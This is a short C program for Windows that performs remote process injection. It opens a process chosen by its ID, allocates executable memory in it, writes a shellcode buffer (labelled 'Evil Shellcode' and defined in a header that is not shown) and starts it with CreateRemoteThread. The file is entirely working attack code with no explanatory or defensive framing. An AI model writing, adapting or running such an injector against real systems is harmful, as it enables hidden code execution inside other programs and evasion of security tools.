#include <windows.h>
#include <stdio.h>
#include "dlli.h"


int main(int argc, CHAR* argv[]){
    // Evil Shellcode 
    
    HANDLE hProcess;
	HANDLE hRThread;
	PVOID lpBuffer;
    size_t dwBytesWritten = 0;
	printf("Injecting to PID: %i", atoi(argv[1]));
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    if (!hProcess){
        printf("Failed to get handle: %lu\n", GetLastError());
        return 0 ;
    }
    // make sure that the handle is valid
	lpBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        scSize, 
        (MEM_RESERVE | MEM_COMMIT), 
        PAGE_EXECUTE_READWRITE
        );
    if (lpBuffer == NULL){
        printf("Failed to allocate buffer because of %d\n", GetLastError());
    }
	WriteProcessMemory(hProcess, lpBuffer, shellcode, scSize, &dwBytesWritten);
    printf("Wrote %lu bytes, shellcode is %lu bytes\n", dwBytesWritten, scSize);
	hRThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL);
	CloseHandle(hProcess);
    return 0;
}